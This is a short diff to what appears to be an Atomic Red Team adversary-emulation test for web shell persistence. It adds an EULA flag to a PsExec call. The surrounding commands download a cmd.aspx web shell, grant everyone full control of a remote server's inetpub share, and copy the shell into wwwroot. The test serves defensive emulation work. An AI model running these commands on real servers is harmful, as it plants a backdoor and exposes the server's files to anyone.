@@ -35,7 +35,7 @@ atomic_tests:
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
   executor:
     command: |
-      #{psexec_exe} \\#{server} net share inetpub=c:\inetpub /grant:everyone,full
+      #{psexec_exe} \\#{server} net share inetpub=c:\inetpub /grant:everyone,full -accepteula
       net use \\#{server}\inetpub
       xcopy /I /Y #{web_shells} \\#{server}\inetpub\wwwroot
     cleanup_command: |      
